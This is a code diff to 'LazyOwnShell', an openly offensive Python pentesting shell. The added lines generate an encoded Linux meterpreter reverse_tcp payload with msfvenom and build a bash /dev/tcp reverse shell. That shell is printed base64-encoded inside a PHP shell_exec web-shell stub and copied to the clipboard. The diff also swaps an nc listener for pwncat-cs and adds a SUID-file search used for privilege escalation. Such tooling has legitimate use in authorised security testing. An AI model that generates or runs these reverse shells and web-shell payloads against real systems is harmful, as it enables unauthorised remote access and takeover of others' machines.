@@ -796,10 +796,17 @@ class LazyOwnShell(Cmd):
         os.system(
             f'msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f macho > shell64.macho'
         )
+        command = (
+            f'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} '
+            '-b "\\x00\\x0a\\x0d" -e x86/shikata_ga_nai -f c'
+        )
+
+        os.system(command)
+        print_msg(command)
         print_msg(f"LHOST={lhost} LPORT={lport}")
         
         os.system("mv shell* sessions")
-        os.system("chmod +x sessions/*")
+        os.system("chmod +x sessions/shell*")
         print_msg(f"Lazy MSFVenom Reverse_shell payloads in sessions/ ")
         print_msg(f"{MAGENTA}upx to bins to smaller bins{CYAN}")
         os.system("upx sessions/shell.elf")
@@ -1110,7 +1117,7 @@ class LazyOwnShell(Cmd):
                 count = len(params)
                 
                 if count == 1:
-                    print_error(f"you pust pass the dommain like argument ex:{GREEN} wfuzz sub box.htb")
+                    print_error(f"you must pass the dommain like argument ex:{GREEN} wfuzz sub box.htb")
                     return
 
                 arg1 = params[0]
@@ -1594,8 +1601,12 @@ class LazyOwnShell(Cmd):
         if not lhost or not lport:
             print_error(f"lhost and lport must be set.{RESET}")
             return
-        print_msg(f"Try ... bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'")
-        os.system(f"echo \"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\" |  xclip -sel clip")
+        print_msg(f"Try ... /bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'")
+        print('<?shell_exec(base64_decode("') 
+        os.system(f"echo \"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\" | base64") 
+        print('"));?>')
+        os.system(f"echo \"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\" |  xclip -sel clip")
+
         return
 
     def do_disableav(self,line):
@@ -1659,20 +1670,27 @@ class LazyOwnShell(Cmd):
         print_msg(f"{cmd} {YELLOW} Copied to clipboard :D {RESET}")
         return
 
-    def do_nc(self,line):
-        """run nc -lvnp 6666 :) """
+    def do_pwncatcs(self,line):
+        """run pwncat-cs -lp <PORT> :) """
         lport = self.params["lport"]
         if not lport and not line:
             print_error(f"lport must be set or pass the port by parameter like: nc 6666.{RESET}")
             return
         if not line:
-            print_msg(f"Try.. nc -lvnp {lport}{RESET}")
-            os.system(f"stty raw -echo; (stty size; cat) | nc -lvnp {lport}")
+            print_msg(f"Try.. pwncat-cs -lp {lport}{RESET}")
+            os.system(f"pwncat-cs -lp {lport}")
         else:
-            print_msg(f"Try.. nc -lvnp {line}{RESET}")
-            os.system(f"stty raw -echo; (stty size; cat) | nc -lvnp {line}")
-        print_msg(f"    {RED}[*] {YELLOW} Shutdown nc sessions in port {RED} [{lport}|{line}] {RESET}")
+            print_msg(f"Try.. pwncat-cs -lp {line}{RESET}")
+            os.system(f"pwncat-cs -lp {line}")
+        print_msg(f"{RED}[*] {YELLOW} Shutdown pwncat-cs sessions in port {RED} [{lport}|{line}] {RESET}")
         return
+
+    def do_find(self,line):
+        """copy to clipboard this command always forgot :) find / -type f -perm -4000 2>/dev/null"""
+        print_msg(f"{YELLOW}find / -type f -perm -4000 2>/dev/null{RESET}")
+        os.system('echo "find / -type f -perm -4000 2>/dev/null" | xclip -sel clip')
+        print_msg(f"{RED}{MAGENTA}Copied to clipboard {RESET}")
+        return   
 
     def do_sh(self,line):
         """execute some command direct in shell to avoid exit LazyOwn ;)"""
@@ -1765,7 +1783,7 @@ class LazyOwnShell(Cmd):
         '''
 
         # Imprimir el comando para verificar
-        print_msg(GREEN, tcp_cmd, RESET)
+        print_msg(f"{GREEN} {tcp_cmd} {RESET}")
 
         # Copiar el comando al portapapeles
         try:
